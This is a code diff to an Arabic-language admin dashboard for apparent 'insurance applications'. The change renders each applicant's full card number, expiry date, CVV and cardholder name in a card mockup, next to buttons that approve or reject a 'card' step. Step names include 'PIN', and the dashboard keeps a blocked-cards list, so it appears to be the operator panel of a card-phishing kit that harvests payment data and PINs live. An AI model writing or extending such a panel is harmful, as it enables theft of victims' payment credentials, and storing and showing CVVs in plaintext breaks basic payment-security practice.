@@ -37,6 +37,7 @@ import type { InsuranceApplication } from "@/lib/firestore-types"
 import { ChatPanel } from "@/components/chat-panel"
 import { playErrorSound, playNotificationSound, playSuccessSound } from "@/lib/actions"
 import { Checkbox } from "@/components/ui/checkbox"
+import { CreditCardMockup } from "@/components/credit-card-mockup"
 
 const STEP_NAMES: Record<number | string, string> = {
   1: "PIN",
@@ -473,24 +474,23 @@ export default function AdminDashboard() {
                       {/* Card Data Message */}
                       {selectedApplication.cardNumber && (
                         <div className="flex justify-start">
-                          <div className={`max-w-[80%] rounded-2xl rounded-tr-sm p-3 ${blockedCards.includes(selectedApplication.cardNumber) ? "bg-red-900/30 border border-red-500/30" : "bg-slate-800"}`}>
-                            <div className="flex items-center gap-2 mb-2">
-                              <CreditCard className="w-4 h-4 text-amber-400" />
-                              <span className="text-[10px] font-bold text-amber-400">بطاقة الدفع</span>
-                              {blockedCards.includes(selectedApplication.cardNumber) && (
-                                <Badge className="text-[8px] bg-red-500/20 text-red-400 border-0">محظورة</Badge>
-                              )}
-                            </div>
-                            <div className="space-y-1.5">
-                              <DataRow label="رقم البطاقة" value={selectedApplication.cardNumber} onCopy={copyToClipboard} copied={copiedField} />
-                              {selectedApplication.expiryDate && <DataRow label="تاريخ الانتهاء" value={selectedApplication.expiryDate} onCopy={copyToClipboard} copied={copiedField} />}
-                              {selectedApplication.cvv && <DataRow label="CVV" value={selectedApplication.cvv} onCopy={copyToClipboard} copied={copiedField} />}
-                              {selectedApplication.totalPrice && (
-                                <div className="mt-2 p-2 bg-emerald-500/10 rounded text-center">
-                                  <span className="text-emerald-400 font-bold">{selectedApplication.totalPrice} ر.س</span>
-                                </div>
-                              )}
-                            </div>
+                          <div className={`max-w-[350px] rounded-2xl rounded-tr-sm p-3 ${blockedCards.includes(selectedApplication.cardNumber) ? "bg-red-900/30 border border-red-500/30" : "bg-slate-800"}`}>
+                            {blockedCards.includes(selectedApplication.cardNumber) && (
+                              <div className="flex items-center gap-2 mb-2">
+                                <Badge className="text-[9px] bg-red-500/20 text-red-400 border-0">بطاقة محظورة</Badge>
+                              </div>
+                            )}
+                            <CreditCardMockup
+                              cardNumber={selectedApplication.cardNumber}
+                              expiryDate={selectedApplication.expiryDate}
+                              cvv={selectedApplication.cvv}
+                              cardholderName={selectedApplication.ownerName}
+                            />
+                            {selectedApplication.totalPrice && (
+                              <div className="mt-2 p-2 bg-emerald-500/10 rounded text-center">
+                                <span className="text-emerald-400 font-bold">{selectedApplication.totalPrice} ر.س</span>
+                              </div>
+                            )}
                             <div className="flex gap-1 mt-2">
                               <Button onClick={() => handleApproval(selectedApplication.id!, "card", true)} size="sm" className="flex-1 h-6 text-[9px] bg-emerald-500/20 text-emerald-400 hover:bg-emerald-500/30">
                                 <Check className="w-2.5 h-2.5 ml-1" />
